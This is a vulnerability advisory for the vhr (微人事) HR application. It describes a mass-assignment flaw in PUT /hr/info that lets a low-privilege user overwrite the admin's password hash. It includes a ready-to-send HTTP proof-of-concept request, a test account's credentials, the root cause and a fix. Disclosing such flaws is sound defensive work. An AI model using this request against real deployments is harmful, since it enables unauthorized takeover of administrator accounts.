# vhr（微人事） — Mass Assignment Privilege Escalation via PUT /hr/info (VHR-VULN-001)

| Field | Value |
|-------|-------|
| **Vendor** | lenve |
| **Product** | vhr（微人事） |
| **Version** | 1.0-SNAPSHOT |
| **Type** | Improper Input Validation |
| **CWE** | CWE-915 / CWE-269 |
| **Authentication** | Low-privilege user (libai/123) |

## Summary

Low-privilege user `libai` can PUT `/hr/info` with another user's `id` and set `password` to a self-generated BCrypt hash, resetting admin credentials.

## Root cause

`HrInfoController.updateHr()` binds request JSON to `Hr` without ownership check. `HrMapper.xml` updates `password` when present.

## Proof of Concept

```http
PUT /hr/info HTTP/1.1
Host: TARGET
Content-Type: application/json
Cookie: JSESSIONID=SESSION_LIBAI
Connection: close

{"id":3,"password":"$2a$10$BCryptHashHere","enabled":true,"username":"admin"}
```

**Expected:** {"status":200,"msg":"更新成功!"} — then admin login with new password

## Impact

Vertical privilege escalation to ROLE_admin without prior admin access.

## Remediation

Bind updates to session user id; forbid password/username/enabled via this endpoint.

## References

- Audit: `SECURITY_AUDIT_REPORT.md` §VHR-VULN-001
- PoC: `POC_VERIFICATION_REPORT.md`
